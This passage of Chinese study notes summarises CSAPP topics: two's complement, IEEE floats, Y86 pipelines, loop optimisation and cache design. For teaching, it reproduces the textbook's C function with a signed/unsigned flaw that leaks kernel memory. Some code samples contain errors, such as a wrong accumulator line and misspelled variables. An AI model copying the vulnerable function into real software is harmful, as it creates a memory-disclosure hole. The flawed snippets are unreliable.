<li>操作系统实现这种进程交错指令的机制称为<em>上下文切换</em>。<em>上下文</em>是操作系统保持跟踪进程运行所需的所有状态信息。</li>
</ul>
</li>
<li><strong>线程</strong>
<ul>
<li>一个进程实际上可以由多个称为<em>线程</em>的执行单位组成</li>
<li>每个线程都运行在进程的上下文中，并共享同样代码和全局数据。</li>
<li>多线程之间比多进程之间更容易共享数据。线程一般来说也比进程更高效。</li>
</ul>
</li>
<li><strong>虚拟内存</strong>
<ul>
<li>虚拟内存为每个进程提供了一个假象——即每个继承都在独占地使用主存。每个进程看到的内存都是一致的，称为<em>虚拟地址空间</em>。</li>
<li>虚拟内存的布局从低地址到高地址，分别为
<ul>
<li>程序代码和数据。其中的数据包括全局变量与只读变量（例如字符串）</li>
<li>堆内存。当调用内存分配或释放函数时。对可以在运行时动态地扩展和收缩。</li>
<li>共享库。地址中间部分是一块用来存放像C标准库和数学库这样地共享库代码和数据的区域。</li>
<li>栈内存。位于用户虚拟地址空间顶部的是用户栈，编译器用它来实现函数调用。</li>
<li>内核虚拟内存。地址空间最顶部的区域是为内核保留的。不允许应用程序读/写/执行这个区域的内容。应用程序只能调用内核来执行这些操作。<br>
<img src="/2020/07/csapp/chapters1_vm.png" alt="img"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="二、-信息的表示和处理">二、 信息的表示和处理</h2>
<h3 id="1-字节顺序">1) 字节顺序</h3>
<ul>
<li>字节顺序分为<em>大端序</em>(big-endian)和<em>小端序</em>(liggle-endian)。大多数机器使用的都是小端序。<br>
<img src="/2020/07/csapp/chapters2_endian.png" alt="img"></li>
</ul>
<h3 id="2-补码-two’s-complement">2) 补码(two’s complement)</h3>
<ul>
<li>
<p>为了在正数的基础上实现负数的表达，将数据的最高位设置为符号位。当符号位为0时，当前数据表示为正数；当符号位为1时，当前数据表示为负数。</p>
</li>
<li>
<p>故以32位int类型为例，其正数范围为<code>0x00000001 ~ 0x7fffffff</code>；负数范围为<code>0x80000000~0xffffffff</code>.取值范围为<code>-2147483648~2147483647</code>.</p>
</li>
<li>
<p>取值范围不是对称的，负数的范围比正数的范围大一。故在int类型中，不是所有的负数都存在其相反数。例如以下例子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(-INT_MIN == INT_MIN)</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"This meassages will always be printed."</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>INT_MIN == -2147483648</code>，故<code>-INT_MIN == 2147483648 == INT_MAX + 1</code>，<code>-INT_MIN</code>范围超过int最大值，造成上溢，故最后的值还是<code>INT_MIN</code>，即<code>-INT_MIN == INT_MIN</code>。</p>
</li>
</ul>
<h3 id="3-有符号整数和无符号整数">3) 有符号整数和无符号整数</h3>
<ul>
<li>
<p>通过强制类型转换来转换无符号/有符号类型，其数据的<strong>位值不变</strong>，但改变了<strong>解释这些位的方式</strong>。</p>
</li>
<li>
<p>需要注意的是，尽量避免无符号/有符号类型的混用，因为这样可能会进行隐式类型转换，造成非预期的错误。例如以下漏洞代码</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KSIZE 1024</span></span><br><span class="line"><span class="keyword">char</span> kbuf[KSIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memcpy</span><span class="params">(<span class="keyword">void</span> *dest, <span class="keyword">void</span>*src, <span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_from_kernel</span><span class="params">(<span class="keyword">void</span>* user_dest, <span class="keyword">int</span> maxlen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> len = KSIZE &lt; maxlen ? KSIZE : maxlen;</span><br><span class="line">  <span class="built_in">memcpy</span>(user_dest, kbuf, len);</span><br><span class="line">  <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当程度调用<code>copy_from_kernel</code>函数所传入的<code>maxlen</code>参数为负数时，由于隐式类型转换，最终<code>memcpy</code>里的参数<code>n</code>会是一个非常大的无符号整数，这将使程序读取到它没有被被授权的内核内存区域。</p>
</li>
</ul>
<h3 id="4-IEEE浮点表示">4) IEEE浮点表示</h3>
<ul>
<li>
<p>二进制小数表示的例子: $0.0011_2 = 0.1875_{10}$</p>
<ul>
<li>$0.0011_2 = 0\times0.1_2 + 0\times0.01_2 + 1\times0.001_2 + 1\times0.0001_2$</li>
<li>$0.1875_{10} = 0\times0.5_{10} + 0\times0.25_{10} + 1\times0.125_{10} + 1\times0.0625_{10}$</li>
<li>二进制与十进制之间的关系是一一对应的</li>
</ul>
</li>
<li>
<p>IEEE浮点标准用$V=(-1)^s\times M\times2^E$的形式来表示一个浮点数：</p>
<ul>
<li>符号(sign)，$s$决定这数是正数还是负数。</li>
<li>尾数(significand)，M是一个二进制小数。</li>
<li>阶码(exponent)， $E$的左右就是为浮点数加权，这个权重是$2^E$（阶码可为负）</li>
</ul>
</li>
<li>
<p>浮点数的位级表示方式</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">float</span>:</span><br><span class="line">位序号：   <span class="number">31</span> | <span class="number">30</span>           <span class="number">23</span> | <span class="number">22</span>                           <span class="number">0</span> |</span><br><span class="line">        +-------------------------------------------------------+</span><br><span class="line">位表示： |  s |     <span class="built_in">exp</span>         |       frac                     |</span><br><span class="line">        +-------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span>:</span><br><span class="line">位序号：   <span class="number">63</span> | <span class="number">62</span>    <span class="number">52</span> | <span class="number">51</span>                                  <span class="number">0</span> |</span><br><span class="line">        +-------------------------------------------------------+</span><br><span class="line">位表示： |  s |     <span class="built_in">exp</span>  |                frac                   |</span><br><span class="line">        +-------------------------------------------------------+</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>浮点数中的阶码并非真正的$2^{exp}$，而是需要减去一个偏移。该偏移为$offset = 2^{n-1} - 1$，其中n为阶码位数。</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// float类型</span></span><br><span class="line"><span class="keyword">int</span> offset = <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">7</span>) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> trueExp = <span class="built_in">exp</span> - offset;</span><br></pre></td></tr></table></figure>
<p>真正的阶码为$2^{exp-offset}$</p>
</li>
<li>
<p>浮点数编码的值有4钟不同的情况</p>
<ul>
<li><strong>规格化</strong> 的。exp != 0 &amp;&amp; exp != 255</li>
<li><strong>非规格化</strong> 的。exp == 0</li>
<li>特殊情况
<ol>
<li><strong>无穷大</strong> 。exp == 255 &amp;&amp; frac == 0</li>
<li><strong>NaN</strong> 。exp == 255 &amp;&amp; frac != 0<br>
<img src="/2020/07/csapp/chapters2_ieee_float_example.png" alt="img"></li>
</ol>
</li>
</ul>
</li>
<li>
<p>尽管浮点数可表达的范围较大，但当浮点数越来越大时，其精度会越来越小；当浮点数越来越小时，其精度也会越来越大。不管精度如何变化，这其中始终存在一个范围。</p>
<blockquote>
<p>浮点数无法精确表示所有的小数。大多数小数都只能近似表示，例如0.1表示为0.100000001。<br>
浮点数也无法精确表示超大整数。超大整数的表示可能会丢失一些精度，例如表示的整数与预期值相差1等等。<br>
<img src="/2020/07/csapp/chapters2_ieee_range.png" alt="img"></p>
</blockquote>
</li>
<li>
<p>float类型最好不要与double类型的数据进行比较，否则会产生一些奇怪的错误，例如以下代码</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">float</span> a = <span class="number">0.1</span>;</span><br><span class="line"><span class="keyword">double</span> b = <span class="number">0.1</span>;</span><br><span class="line"><span class="keyword">if</span> (a == b)</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">"1"</span>;</span><br><span class="line"><span class="keyword">if</span> (a == (<span class="keyword">float</span>)b)</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">"2"</span>;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">double</span>)a == b)</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">"3"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只输出 2</span></span><br></pre></td></tr></table></figure>
<p>当两个浮点数进行比较时，程序会自动将某个浮点数的类型转换成与另一个浮点数相同的类型，并比较其位级表示。 这段代码已经可以验证浮点数的不精确性。</p>
</li>
</ul>
<h2 id="三、-程序的机器级表示">三、 程序的机器级表示</h2>
<blockquote>
<p>常用的汇编指令暂且不表，这里只记录一些特殊的指令</p>
</blockquote>
<h3 id="1-用条件传送来实现条件分支">1) 用条件传送来实现条件分支</h3>
<ul>
<li>
<p>实现条件操作的传统方法是通过使用<em>控制</em>的条件转移，例如各类跳转指令。这种机制十分简单而通用。但在现代处理器上，它可能会非常低效。</p>
<blockquote>
<p>原因是现代处理器使用流水线方式来执行指令。<br>
遇到条件跳转指令时，CPU会预判一条执行路径并将该路径上的指令装载进CPU里。<br>
倘如预判失败，则必须清空流水线上的错误指令，而该操作会消耗大量时间，代价十分高昂。</p>
</blockquote>
</li>
<li>
<p>一种替代策略是使用数据的条件转移。这种方法计算一个条件操作的两种结果，然后根据条件是否满足从中选取一个。如果这种策略在某些情况下可行，则只需用一条简单的条件传送指令来实现。例如以下代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原始C代码</span></span><br><span class="line"><span class="keyword">if</span>(a &gt; b)</span><br><span class="line">  a = b;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 条件转移实现条件分支</span></span><br><span class="line"><span class="comment">// %rdi: a, %rsi: b</span></span><br><span class="line">  test %rdi, %rsi</span><br><span class="line">  jle nextInst</span><br><span class="line">  mov %rdi, %rsi</span><br><span class="line">nextInst:</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 条件传送实现条件分支</span></span><br><span class="line"><span class="comment">// %rdi: a, %rsi: b</span></span><br><span class="line">  test %rdi, %rsi</span><br><span class="line">  <span class="comment">// 当 %rdi &gt; %rsi时，将%rsi中的数据拷贝至%rdi中</span></span><br><span class="line">  cmovg %rdi, %rsi</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="2-浮点代码">2) 浮点代码</h3>
<ul>
<li>浮点数所使用的寄存器与整型所使用的<code>%rdi,%rsi...</code>不同，它们分别是<code>%ymm0~ymm15</code>，每个<code>%ymmX</code>寄存器可以保存32字节。其中<code>%xmmX</code>寄存器是<code>%ymmX</code>寄存器的低16<strong>字节</strong>。</li>
</ul>
<blockquote>
<p>由于浮点数指令使用频率较低，暂且不表</p>
</blockquote>
<h2 id="四、-处理器体系结构">四、 处理器体系结构</h2>
<blockquote>
<p>该章节中，作者定义了一个简单的<code>Y86</code>指令集用于学习，以下笔记均以<code>Y86</code>指令集为基础进行记录。<br>
需要注意的是，尽管书上使用<code>Y86</code>指令集进行讲解，我们仍可通过该指令集来探究现代指令集。</p>
</blockquote>
<ul>
<li>一个处理器支持的指令和指令的字节级编码，称为<em>指令集体系结构</em>(Instruction-Set Architecture, ISA)。</li>
</ul>
<h3 id="1-程序员可见状态">1) 程序员可见状态</h3>
<ul>
<li>程序中的每条指令都会读取或修改处理器状态的某些部分，这成为<em>程序员可见状态</em>
<blockquote>
<p>这里的<em>程序员</em>，既可以是用汇编代码写程序的人，也可以是产生机器级代码的编译器。</p>
</blockquote>
</li>
<li><em>可见状态</em>包括：
<ul>
<li>RF: 程序寄存器</li>
<li>CC: 条件码</li>
<li>Stat: 程序状态。状态码指明程序是否运行正常或发生某个特殊事件。</li>
<li>DMEM: 内存</li>
<li>PC: 程序计数器</li>
</ul>
</li>
</ul>
<h3 id="2-指令编码">2) 指令编码</h3>
<ul>
<li>
<p>每条指令需要1~10个字节不等。其中</p>
</li>
<li>
<p>每条指令的第一个字节表明指示的类型。其中高4位是<em>代码</em>(code)部分，低4位是<em>功能</em>(function)部分。</p>
<blockquote>
<p>功能值只有在一组相关指令共用一个代码时才有用。</p>
</blockquote>
<p>以下是部分指令的具体字节编码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注：方括号中的数据，是指令第一个字节的十六进制表示</span><br><span class="line"></span><br><span class="line">整数操作指令    分支指令                    传送指令</span><br><span class="line">addq [60]     jmp [70]  jne [74]    rrmovq [20] cmovne [24]</span><br><span class="line">subq [61]     jle [71]  jge [75]    cmovle [21] cmovge [25]</span><br><span class="line">andq [62]     jl  [72]  jg  [76]    cmovl  [22] cmovg  [26]</span><br><span class="line">xorq [63]     je  [73]              cmove  [23]</span><br></pre></td></tr></table></figure>
<p>以上面的例子为例，<code>rrmovq</code>指令与条件传送有同样的指令代码，可以把它看作是一个“无条件传送”。</p>
</li>
<li>
<p>指令的长度与指令功能相关，有些需要操作数的指令编码就更长一点。</p>
<ul>
<li>可能有附加的<em>寄存器指示符字节</em>(register specifier byte)，用于指定1~2个寄存器。</li>
<li>有些指令需要一个附加的<em>常数 字</em>(constant word)。这个立即数成为指令的某个操作数.
<blockquote>
<p>例如<code>irmovq $1, %rax</code>。<br>
<img src="/2020/07/csapp/chapters4_y86_isa.png" alt="img"></p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h3 id="3-异常">3) 异常</h3>
<ul>
<li>在现代处理器中，当某些代码发生了某种类型的<strong>异常</strong>(exception)，此时处理器会执行异常处理程序。如果程序员没有手动设置异常处理程序，则CPU会执行默认的处理程序。
<blockquote>
<p>大多数情况下默认的处理程序只会简单的关闭程序。</p>
</blockquote>
</li>
</ul>
<h3 id="4-SEQ阶段">4) SEQ阶段</h3>
<p><img src="/2020/07/csapp/chapters4_y86_graph.png" alt="img"></p>
<blockquote>
<p>详细细节请翻阅CSAPP第三版第277页，这里只是简单概述</p>
</blockquote>
<ul>
<li>取指阶段
<ul>
<li>以PC作为第一个字节的地址，指令内存硬件单元会一次从内存中读出10个字节。并将第一个字节分割成两个4位的数，用于计算指令和功能码。</li>
<li>PC增加硬件单元会根据当前PC以及CPU内的信号来生成下一条指令的PC。<br>
$new PC = old PC + 1 + r + 8i$（$r$为当前指令是否需要寄存器指示字节，$i$为需要的常数字节数）
<blockquote>
<p>注意，此时只是计算，还没有设置下一条的PC<br>
<img src="/2020/07/csapp/chapters4_y86_fetch.png" alt="img"></p>
</blockquote>
</li>
</ul>
</li>
<li>译码和写回阶段
<ul>
<li>寄存器文件有两个读端口A和B，从这两个端口同时读取寄存器值valA和valB<br>
<img src="/2020/07/csapp/chapters4_y86_translate.png" alt="img"></li>
</ul>
</li>
<li>执行阶段
<ul>
<li>执行阶段包括ALU，该单元更具<code>alufun</code>信号的设置，对输入的<code>aluA</code>、<code>aluB</code>执行特定操作。</li>
<li>指令阶段还包括条件码寄存器。每次运行时，ALU都会产生三个与条件码相关的信号——零、符号、溢出。</li>
<li>标号为<code>cond</code>的硬件单元会根据条件码和功能码来确定是否进行条件分支或条件数据传送。<br>
<img src="/2020/07/csapp/chapters4_y86_exec.png" alt="img"></li>
</ul>
</li>
<li>访存阶段
<ul>
<li>该阶段的任务为读写程序数据。读写的对象除了主存以外，还包括寄存器文件<br>
<img src="/2020/07/csapp/chapters4_y86_visitM.png" alt="img"></li>
</ul>
</li>
<li>更新PC阶段
<ul>
<li>根据指令的类型以及是否选择分支来设置新的PC。如果没有跳转，则使用取指阶段计算出的新PC值。<br>
<img src="/2020/07/csapp/chapters4_y86_updatePC.png" alt="img"></li>
</ul>
</li>
</ul>
<h3 id="5-流水线">5) 流水线</h3>
<h4 id="a-流水线冒险">a. 流水线冒险</h4>
<ul>
<li>
<p>将流水线技术引入一个待反馈的系统，当相邻指令间存在相关时会导致问题。</p>
<blockquote>
<p>这里的<em>相关</em>有两种形式：<br>
1.数据相关。下一条指令会用到当前指令计算出的结果。<br>
2.控制相关。一条指令要确定下一条指令的位置。</p>
</blockquote>
<p>这些相关可能会导致流水线产生计算错误，称为冒险(hazard)。其中也分为<em>数据冒险</em>和<em>控制冒险</em>。</p>
</li>
<li>
<p>避免冒险的方式</p>
<ul>
<li>暂停(stalling)。暂停技术阻塞一组指令在它们所处的阶段，而允许其他指令继续通过流水线，直到冒险条件不再满足。其处理方法为：每次要阻塞一条指令在译码阶段，就在指令阶段插入一个气泡（bubble）。气泡类似nop指令，不会更改寄存器、内存、条件码与程序状态。<br>
<img src="/2020/07/csapp/chapters4_pipelin_bubble.png" alt="img"></li>
<li>转发(formarding)。将结果值直接从一个流水线阶段传到较早阶段的技术称为数据转发，也称旁路(bypassing)。<br>
<img src="/2020/07/csapp/chapters4_pipelin_forward.png" alt="img"></li>
</ul>
</li>
<li>
<p>为了提高CPU的运行速度，应尽量避免流水线冒险</p>
</li>
</ul>
<h2 id="五、-优化程序性能">五、 优化程序性能</h2>
<h3 id="1-代码移动">1) 代码移动</h3>
<p>将循环不变量从循环中提出。例如以下操作</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 优化前</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++)</span><br><span class="line">  Statements;</span><br><span class="line"><span class="comment">// 优化后</span></span><br><span class="line"><span class="keyword">size_t</span> str_len = <span class="built_in">strlen</span>(str);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; str_len; i++)</span><br><span class="line">  Statements;</span><br></pre></td></tr></table></figure>
<p>上面的例子中，未优化版本在某些情况下，其时间复杂度可达到$O(N^2)$级别！改进后的时间复杂度只有$O(N)$。</p>
<h3 id="2-消除不必要的内存引用">2) 消除不必要的内存引用</h3>
<p>减少不必要的内存读/写以获得更高的执行速度。</p>
<h3 id="3-理解现代处理器">3) 理解现代处理器</h3>
<p>现代处理器使用流水线机制，同时搭配高速缓存内存以达到更高的速度。避免流水线暂停或cache中数据未命中，可以让CPU尽可能地发挥出全部性能。</p>
<h3 id="4-循环展开">4) 循环展开</h3>
<ul>
<li>
<p>循环展开是一种程序变换，通过增加每次迭代计算的元素数量，减少循环的迭代次数。</p>
</li>
<li>
<p>例子：</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 循环展开前</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lmits; i++)</span><br><span class="line">  acc0 = acc0 OP data[i];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环展开后</span></span><br><span class="line"><span class="keyword">int</span> limits = length - n;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lmits; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">  acc0 = acc0 OP data[i];</span><br><span class="line">  acc0 = acc0 OP data[i+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(; i &lt; length; i ++)</span><br><span class="line">  acc0 = acc0 OP data[i];</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="5-多个累计变量">5) 多个累计变量</h3>
<ul>
<li>
<p>对于一个可结合或可交换的合并运算，我们可以通过将一组合并运算分割成两个或更多的部分，并在最后合并结果来提高性能。</p>
</li>
<li>
<p>例子</p>
<blockquote>
<p>该例子还运用了循环展开技术。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> limits = length - n;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lmits; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">  acc0 = acc0 OP data[i];</span><br><span class="line">  acc1 = acc0 OP data[i+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(; i &lt; length; i ++)</span><br><span class="line">  acc0 = acc0 OP data[i];</span><br><span class="line"><span class="keyword">int</span> total = acc0 + acc1;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="六、-存储器层次结构">六、 存储器层次结构</h2>
<h3 id="1-局部性">1) 局部性</h3>
<ul>
<li>一个编写良好的计算机程序常常具有良好的<em>局部性</em>(locality)。</li>
<li>程序倾向于引用邻近于其他最近引用过的数据项的数据项，或者最近引用过的数据项本身。这种倾向性，被称为<em>局部性原理</em>(principle of locality)。</li>
<li>局部性通常由两种不同的形式，分别为<em>时间局部性</em>和<em>空间局部性</em>
<ul>
<li>时间局部性：被引用过的一次的内存位置很可能在不远的将来被多次引用。</li>
<li>空间局部性：如果一个内存位置被引用了一次，那么程序很可能在不远处的将来引用附近的一个内存位置。</li>
</ul>
</li>
<li>有良好局部性的程序比局部性差的程序运行的更快。</li>
</ul>
<h3 id="2-高速缓存存储器">2) 高速缓存存储器</h3>
<ul>
<li>Cache是一种小容量高速缓冲存储器，它由SRAM组成，其直接制作在CPU芯片内，速度几乎与CPU一样快。</li>
<li>程序运行时，CPU使用的一部分数据/指令会预先成批拷贝在Cache中，当CPU需要从内存读/写数据或指令时，先检查Cache，若有，就直接从Cache中读取，而不用访问主存储器。</li>
<li>由于程序访问的局部性特征，大多数情况下CPU可以直接从这个高速缓存中取得指令和数据，不必再访问主存。这大大提高了访存速度。</li>
<li>Cache的通用组织<br>
<img src="/2020/07/csapp/chapter6_cache.png" alt="img"></li>
<li>有效位
<ul>
<li>有效位为0时表示信息无效，为1表示信息有效</li>
<li>开机或复位时，所有高速缓存行的有效位V = 0</li>
<li>某行被替换后使其为1</li>
<li>某行被装入新快后使其为1</li>
<li>通过使V=0冲刷Cache（例如：进程切换）
<blockquote>
<p>“Cache冲刷”指令为操作系统所使用，对操作系统程序员不是透明的。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="a-直接映射高速缓存">a. 直接映射高速缓存</h4>
<ul>
<li>每个组只有一行的高速缓存称为<em>直接映射</em>高速缓存(direct-mapped cache)<br>
<img src="/2020/07/csapp/chapter6_directMap-cache.png" alt="img"></li>
<li>高速缓存请求数据的流程
<ul>
<li>组选择：从主存地址中的特定偏移处抽取s个组索引，这些位被解释成一个对应的无符号整数高速缓存组号。<br>
<img src="/2020/07/csapp/chapter6_directMap-cache_group.png" alt="img"></li>
<li>行匹配：直接映射高速缓存中每组只有一个高速缓存行。如果当前行的有效位已经设置，并且标记(tag)匹配，则缓存命中。</li>
<li>字选择：根据后b位的块内偏移来获取所需的字<br>
<img src="/2020/07/csapp/chapter6_directMap-cache_line.png" alt="img"></li>
<li>行替换：如果缓存不命中，则需要从下一级存储层次结构中取出请求的块，并驱逐并替换高速缓存行。</li>
</ul>
</li>
<li>优点：唯一映射；命中时间小</li>
<li>缺点：缺失率高；关联度低</li>
</ul>
<h4 id="b-全相联高速缓存">b. 全相联高速缓存</h4>
<ul>
<li><em>全相联高速缓存</em>（fully associative cache）是由一个包含所有高速缓存行的组组成的。</li>
<li>全相联高速缓存的结构较为简单<br>
<img src="/2020/07/csapp/chapter6_fullMap-cache.png" alt="img"></li>
<li>全相联高速缓存中的行匹配和字选择与上述的类似，组只有一行所以默认只选择组0。<br>
<img src="/2020/07/csapp/chapter6_fullMap-cache_found.png" alt="img"></li>
<li>由于全相联高速缓存电路必须并行搜索许多相匹配的标记，构成一个又大又快的相联高速缓存十分困难，而且造价昂贵。因此全相联高速缓存只适合做小的高速缓存。
<blockquote>
<p>例如虚拟内存系统中的翻译备用缓冲器，该部件用于缓存页表项。</p>
</blockquote>
</li>
</ul>
<h4 id="c-组相联高速缓存">c. 组相联高速缓存</h4>
<ul>
<li><em>组相联高速缓存</em>（set associative cache）是上述两种高速缓存的结合体。下图是它的结构<br>
<img src="/2020/07/csapp/chapter6_setMapCache.png" alt="img"></li>
<li>组相联高速缓存的组匹配<br>
<img src="/2020/07/csapp/chapter6_setMapCache_group.png" alt="img"></li>
<li>组相联高速缓存的行匹配与字选择<br>
<img src="/2020/07/csapp/chapter6_setMapCache_line.png" alt="img"></li>
<li>组相联高速缓存的不命中。
<ul>
<li>当数据不命中时，需要替换该组中的某一行。其常用的替换算法有：
<ul>
<li>随机替换算法（rand）</li>
<li>先进先出算法（FIFO）</li>
<li>最近最少用LRU（least-recently used）</li>
<li>最不经常用LFU（least-frequently used）</li>
</ul>
</li>
<li>以LRU算法为例。LRU是一种栈算法，它的命中率随组的增大而提高。<br>
LRU具体实现时，通过给每个cache行设定一个计数器，根据计数值来记录主存块的使用情况。
<blockquote>
<p>这个计数值称为<strong>LRU位</strong><br>
当CPU访问了Cache时，每个Cache行的LRU位均递增。在下一次数据未命中时，操作系统通过比较特定组内的LRU位，选出最近最少用的Cache行，驱逐并重新加载数据。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="d-写策略">d. 写策略</h4>
<ul>
<li>必须保持Cache中的数据和主存中数据一致，否则会出现Cache一致性问题。
<blockquote>
<p>例如当多个设备都允许访问主存，或多个CPU都带有各自的Cache而共享主存时</p>
</blockquote>
</li>
<li>写操作有两种情况
<ul>
<li>写命中（Write Hit）：要写的单元已经在Cache中
<ul>
<li>直写（Write Through）: 同时写Cache和主存单元。（速度十分缓慢）</li>
<li>回写（Write Back）: 只写Cache不写主存，缺失时一次写回，每行有个修改位（dirty bit, 脏位），大大降低主存带宽要求，但控制可能很复杂。</li>
</ul>
</li>
<li>写不命中（Write Miss）: 要写的单元不在Cache中
<ul>
<li>写分配（Write Allocate）
<ul>
<li>将主存块装入Cache，然后更新相应单元。</li>
<li>试图利用空间局部性，但每次都要从主存中读入一个块。</li>
</ul>
</li>
<li>写不分配（Not Write Allocate）
<ul>
<li>直接写主存单元，不把主存装入到Cache。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="3-编写高速缓存友好的代码">3) 编写高速缓存友好的代码</h3>
<ul>
<li>
<p>确保代码高速缓存友好的基本方法</p>
<ul>
<li>让最常见的情况运行的快</li>
<li>尽量减小每个循环内部的缓存不命中数量</li>
</ul>
</li>
<li>
<p>编写高速缓存友好的代码的重要问题</p>
<ul>
<li>对局部变量的反复引用是好的，因为编译器能将它们缓存在寄存器中（时间局部性）</li>
<li>步长为1的引用模式是好的，因为存储器层次结构中所有层次上的缓存都是将数据存储为连续的块（空间局部性）</li>
</ul>
</li>
<li>
<p>示例代码</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> m = <span class="number">10000</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> n = <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">int</span> testNum = <span class="number">1000</span>;</span><br><span class="line">  <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span>** nums = <span class="keyword">new</span> <span class="keyword">int</span>* [m];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    nums[i] = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">      nums[i][j] = (i%<span class="number">10</span>) * (j%<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="comment">// 高速缓存友好的代码</span></span><br><span class="line">  total = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; testNum; a++)</span><br><span class="line">    <span class="comment">// 索引顺序为 i,j</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        total += nums[i][j];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">// 高速缓存不友好的代码</span></span><br><span class="line">  total = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; testNum; a++)</span><br><span class="line">    <span class="comment">// 索引顺序为 j, i</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        total += nums[i][j];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t3 = clock();</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">"t1: "</span> &lt;&lt; t1 &lt;&lt; <span class="string">" t2: "</span> &lt;&lt; t2 &lt;&lt; <span class="string">" t3: "</span> &lt;&lt; t3 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span 